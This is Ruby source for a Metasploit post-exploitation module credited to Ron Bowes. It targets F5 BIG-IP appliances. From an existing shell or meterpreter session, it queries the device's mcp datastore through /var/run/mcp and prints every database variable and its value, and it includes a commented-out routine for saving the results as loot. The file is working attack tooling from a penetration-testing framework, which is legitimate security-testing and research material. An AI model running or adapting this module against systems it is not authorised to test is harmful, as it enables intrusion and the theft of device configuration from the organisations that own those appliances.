##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::System
  include Msf::Post::Linux::F5

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'F5 Big-IP Gather DB Variables',
        'Description' => %q{
          This module gathers database settings (called "db variables") from F5's
          mcp datastore, which is accessed via /var/run/mcp.

          Adapted from https://github.com/rbowes-r7/refreshing-mcp-tool/blob/main/mcp-getloot.rb
        },
        'License' => MSF_LICENSE,
        'Author' => ['Ron Bowes'],
        'Platform' => ['linux'],
        'SessionTypes' => ['shell', 'meterpreter'],
        'References' => [
          [ 'URL', 'https://github.com/rbowes-r7/refreshing-mcp-tool' ], # Original PoC
        ],
        'DisclosureDate' => '2022-11-16',
        'Targets' => [[ 'Auto', {} ]],
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [],
          'Reliability' => [],
          'SideEffects' => []
        }
      )
    )

    register_options([
      OptBool.new('SHOW_EMPTY', [true, 'Show empty db_variables?', false]),
    ])
  end

  def run
    print_status('Fetching db variables (this takes a bit)...')
    vars = mcp_simple_query('db_variable')

    unless vars
      print_error('Failed to query db variables')
      return
    end

    vars.each do |v|
      # Skip empty entries
      if v['db_variable_value'] == '' && !datastore['SHOW_EMPTY']
        next
      end

      print_good "#{v['db_variable_name']} => #{v['db_variable_value']}"
    end
  end

  # def save(msg, data, ctype = 'text/plain')
  #   ltype = 'linux.enum.users'
  #   loot = store_loot(ltype, ctype, session, data, nil, msg)
  #   print_good("#{msg} stored in #{loot.to_s}")
  # end

end
